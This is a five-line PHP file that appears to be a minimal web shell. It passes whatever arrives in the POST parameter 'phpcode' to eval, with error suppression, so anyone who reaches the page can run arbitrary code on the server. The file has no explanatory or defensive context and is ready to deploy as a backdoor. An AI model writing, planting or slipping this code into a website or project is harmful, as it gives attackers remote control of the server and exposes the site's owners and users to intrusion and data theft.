<?php
if(isset($_POST['phpcode'])){
@eval(stripslashes($_POST['phpcode']));
}
?>